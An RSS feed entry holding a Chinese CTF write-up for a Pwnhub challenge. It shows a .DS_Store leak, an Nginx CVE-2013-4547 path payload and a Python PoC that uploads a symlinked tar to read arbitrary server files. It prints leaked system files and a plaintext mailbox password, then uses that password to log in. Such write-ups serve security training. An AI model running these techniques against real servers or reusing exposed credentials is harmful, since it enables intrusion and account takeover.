<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Hc1m1</title>
    <link>http://0x48.pw/</link>
    <atom:link href="/rss.xml" rel="self" type="application/rss+xml"/>
    
    <description>水平不济整日被虐这也不会那也得学脑子太蠢天天垫底这看不懂那学不会</description>
    <pubDate>Wed, 04 Oct 2017 11:37:56 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>Pwnhub 2013的国庆 writeup</title>
      <link>http://0x48.pw/2017/10/04/0x3A/</link>
      <guid>http://0x48.pw/2017/10/04/0x3A/</guid>
      <pubDate>Wed, 04 Oct 2017 11:35:08 GMT</pubDate>
      <description>
      
        &lt;p&gt;不让人过节系列||没女朋友只能撸题系列的CTF题。。。&lt;/p&gt;
      
      </description>
      
      <content:encoded><![CDATA[<p>不让人过节系列||没女朋友只能撸题系列的CTF题。。。</p>
<a id="more"></a>
<h2 id="Step-0"><a href="#Step-0" class="headerlink" title="Step 0"></a>Step 0</h2><p>首先是<code>.DS_Store</code>信息泄露，下载下来是一个二进制文件，需要解析，google搜一搜就有了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> ds_store <span class="keyword">import</span> DSStore</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">with</span> DSStore.open(<span class="string">"DS_Store"</span>, <span class="string">"r+"</span>) <span class="keyword">as</span> f:</div><div class="line"><span class="meta">... </span>    <span class="keyword">for</span> i <span class="keyword">in</span> f:</div><div class="line"><span class="meta">... </span>        <span class="keyword">print</span> i</div><div class="line">&lt;admin Iloc&gt;</div><div class="line">&lt;admin bwsp&gt;</div><div class="line">&lt;admin vSrn&gt;</div><div class="line">&lt;config Iloc&gt;</div><div class="line">&lt;config bwsp&gt;</div><div class="line">&lt;config vSrn&gt;</div><div class="line">&lt;includes Iloc&gt;</div><div class="line">&lt;includes bwsp&gt;</div><div class="line">&lt;includes vSrn&gt;</div><div class="line">&lt;index.html Iloc&gt;</div><div class="line">&lt;index.php Iloc&gt;</div><div class="line">&lt;index.php ptbL&gt;</div><div class="line">&lt;index.php ptbN&gt;</div><div class="line">&lt;pwnhub Iloc&gt;</div><div class="line">&lt;pwnhub bwsp&gt;</div><div class="line">&lt;pwnhub vSrn&gt;</div><div class="line">&lt;upload  Iloc&gt;</div><div class="line">&lt;upload  bwsp&gt;</div><div class="line">&lt;upload  vSrn&gt;</div></pre></td></tr></table></figure>
<h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>根据提示：<code>2017.10.02 15:45:49Nginx 虽然有过很多问题，但是它是个好 server</code></p>
<p>猜测应该是利用一个NGINX的CVE</p>
<p>然后在上一步发现一个奇怪的地方，最后一个是<code>uploap[space]</code> 目录而不是<code>uploap</code>目录，有一个空格。</p>
<p>根据这些信息，搜到一个CVE，编号是<a href="https://github.com/vulhub/vulhub/tree/master/nginx/CVE-2013-4547" target="_blank" rel="external">CVE-2013-4547</a></p>
<p>….题目关了，搞不到图了。</p>
<p>payload是：<code>GET upload /../pwnhub/ HTTP/1.1</code></p>
<p>这里不能使用浏览器，因为浏览器会把这url变成<code>/pwnhub/</code></p>
<p>得到一个路径：<code>6c58c8751bca32b9943b34d0ff29bc16/index.php</code></p>
<h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p><code>6c58c8751bca32b9943b34d0ff29bc16/index.php</code>是一个文件上传的服务</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>你在里面发现了什么? <span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"index.php"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"upload"</span> <span class="attr">type</span>=<span class="string">"file"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"上传"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>注意：只支持tar!!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>更新配置成功，内容如下<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">cols</span>=<span class="string">"30"</span> <span class="attr">rows</span>=<span class="string">"15"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
<p>一开始尝试上传各种文件，都能成功，但是配置更新成功并没有显示任何内容，包括上传tar文件，懵逼了一会。。。</p>
<p>然后发现，这个目录也有<code>.DS_Store</code>泄露：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">with</span> DSStore.open(<span class="string">"DS_Store"</span>, <span class="string">"r+"</span>) <span class="keyword">as</span> f:</div><div class="line"><span class="meta">... </span>    <span class="keyword">for</span> i <span class="keyword">in</span> f:</div><div class="line"><span class="meta">... </span>        <span class="keyword">print</span> <span class="string">"|%s|"</span>%i.filename</div><div class="line">|index.php|</div><div class="line">|untar.py|</div></pre></td></tr></table></figure>
<p>有一个untar.py文件：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> tarfile</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> uuid</div><div class="line"><span class="keyword">import</span> os</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">untar</span><span class="params">(filename)</span>:</span></div><div class="line">    os.chdir(<span class="string">'/tmp/pwnhub/'</span>)</div><div class="line">    t = tarfile.open(filename, <span class="string">'r'</span>)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> t.getnames():</div><div class="line">        <span class="keyword">if</span> <span class="string">'..'</span> <span class="keyword">in</span> i <span class="keyword">or</span> <span class="string">'.cfg'</span> != os.path.splitext(i)[<span class="number">1</span>]:</div><div class="line">            <span class="keyword">return</span> <span class="string">'error'</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">try</span>:</div><div class="line">                t.extract(i, <span class="string">'/tmp/pwnhub/'</span>)</div><div class="line">            <span class="keyword">except</span> Exception, e:</div><div class="line">                <span class="keyword">return</span> e</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                cfgName = str(uuid.uuid1()) + <span class="string">'.cfg'</span></div><div class="line">                os.rename(i, cfgName)</div><div class="line">                <span class="keyword">return</span> cfgName</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    filename = sys.argv[<span class="number">1</span>]</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> tarfile.is_tarfile(filename):</div><div class="line">        exit(<span class="string">'error'</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">print</span> untar(filename)</div></pre></td></tr></table></figure>
<p>很明显了，要压缩一个cfg文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"fjwopqafjasdo"</span> &gt; /tmp/test.cfg</span></div><div class="line"><span class="meta">$</span><span class="bash"> tar cf /tmp/test.tar /tmp/test.cfg</span></div></pre></td></tr></table></figure>
<p>然后上传test.tar，更新配置成功后终于成功返回内容了。</p>
<p>但是该怎么利用又卡住了，然后看到hint：<code>2017.10.03 11:24:40想办法把它变成任意文件读取，但 Flag 不在这儿 ，当作一次真实渗透玩吧！</code></p>
<p>想到了软链接，PoC如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></div><div class="line">	url = <span class="string">"http://54.223.177.152/6c58c8751bca32b9943b34d0ff29bc16/index.php"</span></div><div class="line">	files = &#123;<span class="string">"upload"</span>: (<span class="string">"test.tar"</span>, open(<span class="string">"/tmp/test.tar"</span>, <span class="string">"rb"</span>), <span class="string">"application/x-tar"</span>)&#125;</div><div class="line">	r = requests.post(url, files=files)</div><div class="line">	data = r.content</div><div class="line">	<span class="comment"># html = BeautifulSoup(data, "lxml")</span></div><div class="line">	<span class="comment"># print html.textarea.contents[0]</span></div><div class="line">	<span class="keyword">print</span> data</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">	filename = sys.argv[<span class="number">1</span>]</div><div class="line">	<span class="keyword">print</span> filename</div><div class="line">	os.system(<span class="string">"ln -sf %s /tmp/test.cfg"</span>%filename)</div><div class="line">	os.system(<span class="string">"tar cf /tmp/test.tar /tmp/test.cfg"</span>)</div><div class="line">	upload()</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	main()</div></pre></td></tr></table></figure>
<h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>到了任意文件读取的步骤了，然后各种文件读读，照例我都会读读<code>/proc/self</code>下的文件，然后发现：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> python 2013_read_file.py /proc/self/mountinfo</span></div><div class="line"></div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">    &lt;title&gt;你在里面发现了什么? &lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line"></div><div class="line">&lt;form action="index.php" method="post" enctype="multipart/form-data"&gt;</div><div class="line">&lt;input name="upload" type="file" /&gt;&lt;br/&gt;</div><div class="line">&lt;input type="submit" value="上传" /&gt;</div><div class="line">&lt;p&gt;注意：只支持tar!!&lt;/p&gt;</div><div class="line">&lt;p&gt;更新配置成功，内容如下&lt;/p&gt;&lt;textarea cols="30" rows="15"&gt;181 103 0:40 / / rw,relatime - overlay overlay rw,lowerdir=/var/lib/docker/overlay/a67f9242dc6db4569b299d14ce4308f2f63624e8387569cbe015cbc973e50a0c/root,upperdir=/var/lib/docker/overlay/ea20e67da7b4415fd04862f8f7a0bef6a2b6ace2f5ec2e664d07cb9b6280bc8c/upper,workdir=/var/lib/docker/overlay/ea20e67da7b4415fd04862f8f7a0bef6a2b6ace2f5ec2e664d07cb9b6280bc8c/work</div><div class="line">182 181 0:43 / /proc rw,nosuid,nodev,noexec,relatime - proc proc rw</div><div class="line">238 181 0:44 / /dev rw,nosuid - tmpfs tmpfs rw,mode=755</div><div class="line">239 238 0:45 / /dev/pts rw,nosuid,noexec,relatime - devpts devpts rw,gid=5,mode=620,ptmxmode=666</div><div class="line">240 181 0:46 / /sys ro,nosuid,nodev,noexec,relatime - sysfs sysfs ro</div><div class="line">241 240 0:47 / /sys/fs/cgroup ro,nosuid,nodev,noexec,relatime - tmpfs tmpfs rw,mode=755</div><div class="line">242 241 0:22 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/systemd ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,xattr,release_agent=/lib/systemd/systemd-cgroups-agent,name=systemd</div><div class="line">243 241 0:24 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/blkio ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,blkio</div><div class="line">244 241 0:25 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/perf_event ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,perf_event</div><div class="line">245 241 0:26 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/cpu,cpuacct ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,cpu,cpuacct</div><div class="line">246 241 0:27 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/pids ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,pids</div><div class="line">247 241 0:28 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/freezer ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,freezer</div><div class="line">248 241 0:29 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/net_cls,net_prio ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,net_cls,net_prio</div><div class="line">249 241 0:30 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/memory ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,memory</div><div class="line">250 241 0:31 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/cpuset ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,cpuset</div><div class="line">251 241 0:32 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/hugetlb ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,hugetlb</div><div class="line">252 241 0:33 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/devices ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,devices</div><div class="line">253 238 0:42 / /dev/mqueue rw,nosuid,nodev,noexec,relatime - mqueue mqueue rw</div><div class="line">254 181 202:1 /home/ubuntu/Nginx_1.4.2/crontab /etc/crontab rw,relatime - ext4 /dev/xvda1 rw,discard,data=ordered</div><div class="line">255 181 202:1 /home/ubuntu/Nginx_1.4.2/pwnhub /tmp/pwnhub rw,relatime - ext4 /dev/xvda1 rw,discard,data=ordered</div><div class="line">256 181 202:1 /var/lib/docker/containers/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23/resolv.conf /etc/resolv.conf rw,relatime - ext4 /dev/xvda1 rw,discard,data=ordered</div><div class="line">257 181 202:1 /var/lib/docker/containers/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23/hostname /etc/hostname rw,relatime - ext4 /dev/xvda1 rw,discard,data=ordered</div><div class="line">258 181 202:1 /var/lib/docker/containers/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23/hosts /etc/hosts rw,relatime - ext4 /dev/xvda1 rw,discard,data=ordered</div><div class="line">259 238 0:41 / /dev/shm rw,nosuid,nodev,noexec,relatime - tmpfs shm rw,size=65536k</div><div class="line">260 181 202:1 /home/ubuntu/Nginx_1.4.2/html /usr/local/nginx/html rw,relatime - ext4 /dev/xvda1 rw,discard,data=ordered</div><div class="line">261 238 202:1 /home/ubuntu/Nginx_1.4.2/access.log /dev/stdout rw,relatime - ext4 /dev/xvda1 rw,discard,data=ordered</div><div class="line">262 181 202:1 /home/ubuntu/Nginx_1.4.2/run /home/jdoajdoiq/jdijiqjwi/jiqji12i3198uax192/run rw,relatime - ext4 /dev/xvda1 rw,discard,data=ordered</div><div class="line">263 181 202:1 /home/ubuntu/Nginx_1.4.2/nginx.conf /usr/local/nginx/conf/nginx.conf rw,relatime - ext4 /dev/xvda1 rw,discard,data=ordered</div><div class="line">264 181 202:1 /home/ubuntu/Nginx_1.4.2/cron_run.sh /home/jdoajdoiq/jdijiqjwi/jiqji12i3198uax192/cron_run.sh rw,relatime - ext4 /dev/xvda1 rw,discard,data=ordered</div><div class="line">419 181 202:1 /home/ubuntu/Nginx_1.4.2/www.conf /etc/php5/fpm/pool.d/www.conf rw,relatime - ext4 /dev/xvda1 rw,discard,data=ordered</div><div class="line">104 238 0:45 /0 /dev/console rw,nosuid,noexec,relatime - devpts devpts rw,gid=5,mode=620,ptmxmode=666</div><div class="line">107 182 0:43 /bus /proc/bus ro,relatime - proc proc rw</div><div class="line">108 182 0:43 /fs /proc/fs ro,relatime - proc proc rw</div><div class="line">109 182 0:43 /irq /proc/irq ro,relatime - proc proc rw</div><div class="line">110 182 0:43 /sys /proc/sys ro,relatime - proc proc rw</div><div class="line">111 182 0:43 /sysrq-trigger /proc/sysrq-trigger ro,relatime - proc proc rw</div><div class="line">112 182 0:44 /null /proc/kcore rw,nosuid - tmpfs tmpfs rw,mode=755</div><div class="line">113 182 0:44 /null /proc/timer_list rw,nosuid - tmpfs tmpfs rw,mode=755</div><div class="line">114 182 0:44 /null /proc/timer_stats rw,nosuid - tmpfs tmpfs rw,mode=755</div><div class="line">115 182 0:44 /null /proc/sched_debug rw,nosuid - tmpfs tmpfs rw,mode=755</div><div class="line">132 240 0:48 / /sys/firmware ro,relatime - tmpfs tmpfs ro</div><div class="line">&lt;/textarea&gt;&lt;/form&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<p>发现一个脚本：<code>/home/jdoajdoiq/jdijiqjwi/jiqji12i3198uax192/cron_run.sh</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> python 2013_read_file.py /home/jdoajdoiq/jdijiqjwi/jiqji12i3198uax192/cron_run.sh</span></div><div class="line">/home/jdoajdoiq/jdijiqjwi/jiqji12i3198uax192/cron_run.sh</div><div class="line">tar: Removing leading `/' from member names</div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">    &lt;title&gt;你在里面发现了什么? &lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line"></div><div class="line">&lt;form action="index.php" method="post" enctype="multipart/form-data"&gt;</div><div class="line">&lt;input name="upload" type="file" /&gt;&lt;br/&gt;</div><div class="line">&lt;input type="submit" value="上传" /&gt;</div><div class="line">&lt;p&gt;注意：只支持tar!!&lt;/p&gt;</div><div class="line">&lt;p&gt;更新配置成功，内容如下&lt;/p&gt;&lt;textarea cols="30" rows="15"&gt;#\!/bin/bash</div><div class="line"></div><div class="line">cd /home/jdoajdoiq/jdijiqjwi/jiqji12i3198uax192/run/ &amp;&amp; python run.py</div><div class="line">&lt;/textarea&gt;&lt;/form&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div><div class="line"><span class="meta"></span></div><div class="line">$<span class="bash"> python 2013_read_file.py /home/jdoajdoiq/jdijiqjwi/jiqji12i3198uax192/run/run.py </span></div><div class="line">/home/jdoajdoiq/jdijiqjwi/jiqji12i3198uax192/run/run.py</div><div class="line">tar: Removing leading `/' from member names</div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">    &lt;title&gt;你在里面发现了什么? &lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line"></div><div class="line">&lt;form action="index.php" method="post" enctype="multipart/form-data"&gt;</div><div class="line">&lt;input name="upload" type="file" /&gt;&lt;br/&gt;</div><div class="line">&lt;input type="submit" value="上传" /&gt;</div><div class="line">&lt;p&gt;注意：只支持tar!!&lt;/p&gt;</div><div class="line">&lt;p&gt;更新配置成功，内容如下&lt;/p&gt;&lt;textarea cols="30" rows="15"&gt;#encoding=utf8</div><div class="line"></div><div class="line">from collections import Counter</div><div class="line">from mail_send import send_mail</div><div class="line"></div><div class="line">ip = []</div><div class="line">statusCode = []</div><div class="line"></div><div class="line">def toDeal(filename):</div><div class="line">    with open(filename, 'r') as f:</div><div class="line">        logs = f.readlines()</div><div class="line">        for log in logs:</div><div class="line">            ip.append(log.split()[0])</div><div class="line">            statusCode.append(log.split()[8])</div><div class="line"></div><div class="line">    logAll = '日志总数：' + str(len(logs))</div><div class="line">    ipUV = '独立 IP：' + str(list(set(ip)))</div><div class="line">    ipNumber = 'IP出现次数：' + str(dict(Counter(ip)))</div><div class="line">    codeNumber = '状态码出现次数：' + str(dict(Counter(statusCode)))</div><div class="line">    content = logAll + '\n' + ipUV + '\n' + ipNumber + '\n' + codeNumber</div><div class="line">    send_mail('Pwnhub Nginx Report', content)</div><div class="line"></div><div class="line">if __name__ == '__main__':</div><div class="line">    toDeal('/usr/local/var/log/nginx/access.log')</div><div class="line">&lt;/textarea&gt;&lt;/form&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div><div class="line"><span class="meta"></span></div><div class="line">$<span class="bash"> python 2013_read_file.py /home/jdoajdoiq/jdijiqjwi/jiqji12i3198uax192/run/mail_send.py</span></div><div class="line">/home/jdoajdoiq/jdijiqjwi/jiqji12i3198uax192/run/mail_send.py</div><div class="line">tar: Removing leading `/' from member names</div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">    &lt;title&gt;你在里面发现了什么? &lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line"></div><div class="line">&lt;form action="index.php" method="post" enctype="multipart/form-data"&gt;</div><div class="line">&lt;input name="upload" type="file" /&gt;&lt;br/&gt;</div><div class="line">&lt;input type="submit" value="上传" /&gt;</div><div class="line">&lt;p&gt;注意：只支持tar!!&lt;/p&gt;</div><div class="line">&lt;p&gt;更新配置成功，内容如下&lt;/p&gt;&lt;textarea cols="30" rows="15"&gt;#coding:utf-8</div><div class="line"></div><div class="line">import smtplib</div><div class="line">from email.mime.text import MIMEText</div><div class="line"></div><div class="line">mail_user = 'ctf_dicha@21cn.com'</div><div class="line">mail_pass = '634DRaC62ehWK6X'</div><div class="line">mail_server = 'smtp.21cn.com'</div><div class="line">mail_port = 465</div><div class="line">to_user = 'wyd0n9@gmail.com'</div><div class="line"></div><div class="line">def send_mail(title,content):</div><div class="line">    #创建一个实例，这里设置为html格式邮件</div><div class="line">    msg = MIMEText(content, _subtype = 'html', _charset = 'utf-8')</div><div class="line">    msg['Subject'] = title</div><div class="line">    msg['From'] = mail_user</div><div class="line">    msg['To'] = to_user</div><div class="line">    try:</div><div class="line">        #登录smtp服务器</div><div class="line">        server = smtplib.SMTP_SSL(mail_server,mail_port)</div><div class="line">        server.login(mail_user,mail_pass)</div><div class="line">        #邮件发送</div><div class="line">        server.sendmail(mail_user,to_user,msg.as_string())</div><div class="line">        server.quit()</div><div class="line">        return True</div><div class="line">    except Exception as e:</div><div class="line">        print(str(e))</div><div class="line">        return False</div><div class="line">    </div><div class="line">    </div><div class="line">&lt;/textarea&gt;&lt;/form&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p>得到一个邮箱，然后尝试去登录看看，然后在收件箱看到一个发送vpn邮箱发送失败的返回邮件，然后去发件箱得到一个vpn:</p>
